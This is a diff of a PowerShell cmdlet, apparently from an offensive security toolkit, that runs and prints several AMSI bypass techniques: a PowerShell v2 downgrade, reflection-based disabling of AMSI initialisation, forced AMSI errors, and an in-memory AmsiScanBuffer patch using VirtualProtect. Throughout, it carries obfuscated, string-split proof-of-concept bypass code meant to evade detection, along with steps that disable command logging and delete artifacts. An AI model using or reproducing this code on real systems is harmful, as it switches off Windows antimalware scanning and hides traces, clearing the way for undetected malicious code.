@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v2.3.8
+   PS cmdlet Dev version: v2.3.9
    
 .DESCRIPTION
    This cmdlet tests an internal list of amsi_bypass_technics on
@@ -49,38 +49,38 @@
    Testing amsi_bypass technics
    ----------------------------
    Id          : 1
-   bypass      : available
+   bypass      : success
    Disclosure  : @nullbyte
    Description : PS_DOWNGRADE_ATTACK
-   POC         : powershell -version 2 -C Get-Host
-   Remark      : Manual Execute 'powershell -version 2'
+   POC         : Execute: -----
+   Remark      : Execute: 'exit' to return to PSv5 console!
 
    Id          : 2
    bypass      : success
    Disclosure  : @mattifestation
    Description : DLL_REFLECTION
-   POC         : ----
+   POC         : Execute: ----
    Remark      : string detection successfully disabled
 
    Id          : 3
    bypass      : success
    Disclosure  : @mattifestation
    Description : FORCE_AMSI_ERROR
-   POC         : ----
+   POC         : Execute: ----
    Remark      : string detection successfully disabled 
    
    Id          : 4
    bypass      : success
    Disclosure  : @_RastaMouse
    Description : AMSI_RESULT_CLEAN
-   POC         : ----
+   POC         : Execute: ----
    Remark      : string detection successfully disabled
 
    Id          : 5
    bypass      : success
    Disclosure  : @am0nsec
    Description : AMSI_SCANBUFFER_PATCH
-   POC         : ----
+   POC         : Execute: ----
    Remark      : string detection successfully disabled 
 
 .LINK
@@ -98,7 +98,7 @@
 
 
 $viriato='0'#Redpill Conf
-$CmdletVersion = "v2.3.8"
+$CmdletVersion = "v2.3.9"
 ## Global cmdlet variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -193,35 +193,54 @@ If($Action -ieq "Bypass")
          If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
          {
             ## Make sure version 2.0 its available before go any further!
-            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | Where-Object { $_ -Match ': 2.0' }
-            If(-not($PS2version))
-            {
-               Write-Host "[error] powershell -version 2 not found in $Env:COMPUTERNAME system!" -ForegroundColor Red -BackgroundColor Black
-               Write-Host "";Start-Sleep -Seconds 2;exit ## Exit @NoAmsi
+            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | 
+               Where-Object { $_ -iMatch '^(Version)' -and $_ -Match '(: 2.0)$'
             }
 
-            ## add results to table
-            $mytable.Rows.Add("1",
-                              "available",
-                              "@nullbyte",
-                              "PS_DOWNG`RADE_ATT`ACK",
-                              "powershell -version 2 -C Get-Host",
-                              "Manual Execute 'powershell -version 2'")|Out-Null
-            #Display Output Table
-            $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
-            #Delete artifact {logfile} left behind!
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
-            Remove-Item -Path "$Env:TMP\testme.log" -Force
+            If(-not($PS2version))
+            {
+               ## add results to table
+               $mytable.Rows.Add("1",
+                                 "failed",
+                                 "@nullbyte",
+                                 "PS_DOWNG`RADE_ATT`ACK",
+                                 "powershell -version 2 -C Get-Host",
+                                 "Powershell version 2 not found in $Env:COMPUTERNAME!")|Out-Null
+               #Display Output Table
+               $mytable|Format-List > $env:TMP\tbl.log
+               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               #Delete artifact {logfile} left behind!
+               Remove-Item -Path "$Env:TMP\tbl.log" -Force
+               Remove-Item -Path "$Env:TMP\testme.log" -Force
+            }
+            Else
+            {
+               ## retrieve current PS version
+               $CurrentPSv = (Get-Host).Version.Major
+
+               ## add results to table
+               $mytable.Rows.Add("1",
+                                 "success",
+                                 "@nullbyte",
+                                 "PS_DOWNG`RADE_ATT`ACK",
+                                 "Execute: `"$JPGformat`"",
+                                 "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+               #Display Output Table
+               $mytable|Format-List > $env:TMP\tbl.log
+               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               #Delete artifact {logfile} left behind!
+               Remove-Item -Path "$Env:TMP\tbl.log" -Force
+               Remove-Item -Path "$Env:TMP\testme.log" -Force
+               powershell -version 2
+            }
          }
          Else
          {
-            Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black         
+            Write-Host "[error] executing 'PS_DOWNG`RADE_ATT`ACK' bypass!" -ForegroundColor Red -BackgroundColor Black
+            Write-Host "`n"
          }
 
-      }catch{
-         Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black
-      }
+      }catch{}
 
    }
    ElseIf($Id -eq 2)
@@ -250,7 +269,7 @@ If($Action -ieq "Bypass")
                               "success",
                               "@mattifestation",
                               "DL`L_REFL`ECTI`ON",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -258,23 +277,20 @@ If($Action -ieq "Bypass")
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-## POC display
-$POCTable = @"
-`$MsTeamsId = "4456625220575263174452554847"
-`$ComponentDeviceId = "N``onP" + "ubl``ic" -join ''
-`$Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
-`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '
-`$imgForm = `$Drawing.Replace("@","").Replace("£","m");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)
-`$i0Stream = `$Bitmap.GetField(`$Graphics,"`$ComponentDeviceId,Static");`$i0Stream.SetValue(`$null,`$true)
-"@;
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "$POCTable`n`n"
-
+            ## POC display
+            Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
+            Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
+            Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
+            Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
+            Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
+            Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute DL`L_REFLE`CTION bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'DL`L_REFLE`CTION' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
    }
@@ -306,7 +322,7 @@ $POCTable = @"
                               "success",
                               "@mattifestation",
                               "FORCE_AM`SI_ERROR",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -314,25 +330,22 @@ $POCTable = @"
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-## POC display
-$POCTable = @"
-`$Xdatabase = 'Utils';`$Homedrive = 'si'
-`$DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
-`$fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
-`$CleanUp = `$DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
-`$Rawdata = `$fdx.Replace("@","a").Replace("£","i").Replace("+","e")
-`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))
-`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')
-`$Spotfix.SetValue(`$null,`$true)
-"@;
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "$POCTable`n`n"
-
+            ## POC display
+            Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
+            Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
+            Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 200"
+            Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
+            Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
+            Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
+            Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
+            Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute FORCE_AM`SI_ERROR bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'FORCE_AM`SI_ERROR' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
    }
@@ -383,21 +396,21 @@ $POCTable = @"
                               "success",
                               "@_RastaMouse",
                               "AM`SI_RES`ULT_CLEAN",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 1
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n`n"
-
+            Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute AM`SI_RESULT_CLEAN bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'AM`SI_RESULT_CLEAN' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
    }
@@ -419,13 +432,13 @@ $POCTable = @"
 
          public class Kernel32 {
             [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-         public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
             [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string lpLibFileName);
 
-         public static extern IntPtr LoadLibrary(string lpLibFileName);
             [DllImport("kernel32")]
-         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 
@@ -457,7 +470,7 @@ $POCTable = @"
        Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
        If([IntPtr]::Size -eq 8) {
-	       Write-Host "[+] System architecture: 64-bits process"
+	       Write-Host "[+] Process arch: 64-bits process"
            [byte[]]$egg = [byte[]] (
                0x4C, 0x8B, 0xDC,       # mov     r11,rsp
                0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
@@ -469,7 +482,7 @@ $POCTable = @"
                0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
            )
        } Else {
-	       Write-Host "[+] System architecture: 32-bits process"
+	       Write-Host "[+] Process arch: 32-bits process"
            [byte[]]$egg = [byte[]] (
                0x8B, 0xFF,             # mov     edi,edi
                0x55,                   # push    ebp
@@ -497,11 +510,11 @@ $POCTable = @"
          If($?)
          {
             ## add results to table
-            $mytable.Rows.Add("2",
+            $mytable.Rows.Add("5",
                               "success",
                               "@am0nsec",
                               "AM`SI_SCANBUF`FER_PATCH",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Dis play Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -509,14 +522,14 @@ $POCTable = @"
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n`n"
-
+            Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute AMS`I_SCANBUF`FER_PATCH bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'AMS`I_SCANBUF`FER_PATCH' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
    }
@@ -553,32 +566,52 @@ If($Action -ieq "TestAll")
          If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
          {
             ## Make sure version 2.0 its available before go any further!
-            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | Where-Object { $_ -Match ': 2.0' }
-            If(-not($PS2version))
-            {
-               Write-Host "[error] powershell -version 2 not found in $Env:COMPUTERNAME system!" -ForegroundColor Red -BackgroundColor Black
-               Write-Host "";Start-Sleep -Seconds 2;exit ## Exit @NoAmsi
+            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | 
+               Where-Object { $_ -iMatch '^(Version)' -and $_ -Match '(: 2.0)$'
             }
 
-            ## add results to table
-            $mytable.Rows.Add("1",
-                              "available",
-                              "@nullbyte",
-                              "PS_DOWNG`RADE_ATT`ACK",
-                              "powershell -version 2 -C Get-Host",
-                              "Manual Execute 'powershell -version 2'")|Out-Null
+            If(-not($PS2version))
+            {
+               ## add results to table
+               $mytable.Rows.Add("1",
+                                 "failed",
+                                 "@nullbyte",
+                                 "PS_DOWNG`RADE_ATT`ACK",
+                                 "powershell -version 2 -C Get-Host",
+                                 "Powershell version 2 not found in $Env:COMPUTERNAME")|Out-Null
+               #Delete artifact {logfile} left behind!
+               Remove-Item -Path "$Env:TMP\testme.log" -Force
+            }
+            Else
+            {
+               ## retrieve current PS version
+               $CurrentPSv = (Get-Host).Version.Major
 
-            #Delete artifact {logfile} left behind! 
-            Remove-Item -Path "$Env:TMP\testme.log" -Force
+               ## add results to table
+               $mytable.Rows.Add("1",
+                                 "success",
+                                 "@nullbyte",
+                                 "PS_DOWNG`RADE_ATT`ACK",
+                                 "Execute: `"$JPGformat`"",
+                                 "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+               #Display Output Table
+               $mytable|Format-List > $env:TMP\tbl.log
+               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               #Delete artifact {logfile} left behind!
+               Remove-Item -Path "$Env:TMP\tbl.log" -Force
+               Remove-Item -Path "$Env:TMP\testme.log" -Force
+               powershell -version 2
+               #success exec = exit
+               exit
+            }
          }
          Else
          {
-            Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black         
+            Write-Host "[error] executing 'PS_DOWNG`RADE_ATT`ACK' bypass!" -ForegroundColor Red -BackgroundColor Black
+            Write-Host "`n"      
          }
 
-      }catch{
-         Write-Host "[ID:$Id] fail to execute PS_DOWNG`RADE_ATT`ACK technic!" -ForegroundColor Red -BackgroundColor Black
-      }
+      }catch{}
 
        <#
       .SYNOPSIS
@@ -603,33 +636,31 @@ If($Action -ieq "TestAll")
                               "success",
                               "@mattifestation",
                               "DL`L_REFL`ECTI`ON",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
             Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
+            Start-Sleep -Milliseconds 680
 
-## POC display
-$POCTable = @"
-`$MsTeamsId = "4456625220575263174452554847"
-`$ComponentDeviceId = "N``onP" + "ubl``ic" -join ''
-`$Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
-`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '
-`$imgForm = `$Drawing.Replace("@","").Replace("£","m");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)
-`$i0Stream = `$Bitmap.GetField(`$Graphics,"`$ComponentDeviceId,Static");`$i0Stream.SetValue(`$null,`$true)
-"@;
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "$POCTable`n`n"
-         #success exec = exit
-         exit
-
+            ## POC display
+            Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
+            Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
+            Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
+            Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
+            Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
+            Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
+            #success exec = exit
+            exit
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute DL`L_REFLE`CTION bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'DL`L_REFLE`CTION' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
       <#
@@ -657,35 +688,33 @@ $POCTable = @"
                               "success",
                               "@mattifestation",
                               "FORCE_AM`SI_ERROR",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
             Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
+            Start-Sleep -Milliseconds 680
 
-## POC display
-$POCTable = @"
-`$Xdatabase = 'Utils';`$Homedrive = 'si'
-`$DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
-`$fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
-`$CleanUp = `$DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
-`$Rawdata = `$fdx.Replace("@","a").Replace("£","i").Replace("+","e")
-`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))
-`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')
-`$Spotfix.SetValue(`$null,`$true)
-"@;
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "$POCTable`n`n"
-         #success exec = exit
-         exit
-
+            ## POC display
+            Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
+            Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
+            Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 280"
+            Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
+            Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
+            Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
+            Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
+            Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
+            #success exec = exit
+            exit
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute FORCE_AM`SI_ERROR bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'FORCE_AM`SI_ERROR' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"  
       }
 
       <#
@@ -732,23 +761,24 @@ $POCTable = @"
                               "success",
                               "@_RastaMouse",
                               "AM`SI_RES`ULT_CLEAN",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 1
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
+            Start-Sleep -Milliseconds 680
 
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n`n"
-         #success exec = exit
-         exit
-
+            Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
+            #success exec = exit
+            exit
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute AM`SI_RESULT_CLEAN bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'AM`SI_RESULT_CLEAN' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
       <#
@@ -766,13 +796,13 @@ $POCTable = @"
 
          public class Kernel32 {
             [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-         public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
             [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string lpLibFileName);
 
-         public static extern IntPtr LoadLibrary(string lpLibFileName);
             [DllImport("kernel32")]
-         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 
@@ -804,7 +834,7 @@ $POCTable = @"
        Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
        If([IntPtr]::Size -eq 8) {
-	       Write-Host "[+] System architecture: 64-bits process"
+	       Write-Host "[+] Process arch: 64-bits process"
            [byte[]]$egg = [byte[]] (
                0x4C, 0x8B, 0xDC,       # mov     r11,rsp
                0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
@@ -816,7 +846,7 @@ $POCTable = @"
                0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
            )
        } Else {
-	       Write-Host "[+] System architecture: 32-bits process"
+	       Write-Host "[+] Process arch: 32-bits process"
            [byte[]]$egg = [byte[]] (
                0x8B, 0xFF,             # mov     edi,edi
                0x55,                   # push    ebp
@@ -844,26 +874,27 @@ $POCTable = @"
          If($?)
          {
             ## add results to table
-            $mytable.Rows.Add("2",
+            $mytable.Rows.Add("5",
                               "success",
                               "@am0nsec",
                               "AM`SI_SCANBUFF`ER_PATCH",
-                              "`"$JPGformat`"",
+                              "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
-            #Dis play Output Table
+            #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
             Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
+            Start-Sleep -Milliseconds 680
 
-         Write-Host "Proof Of Concept" -ForegroundColor Yellow
-         Write-Host "-------------------------------------------"
-         Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n`n"
-
+            Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
+            Write-Host "-------------------------------------------"
+            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
          }
 
       }catch{
-         Write-Host "[ID:$Id] fail to execute AM`SI_SCANBUFF`ER_PATCH bypass technic!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] executing 'AM`SI_SCANBUFF`ER_PATCH' bypass!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "`n"
       }
 
 }
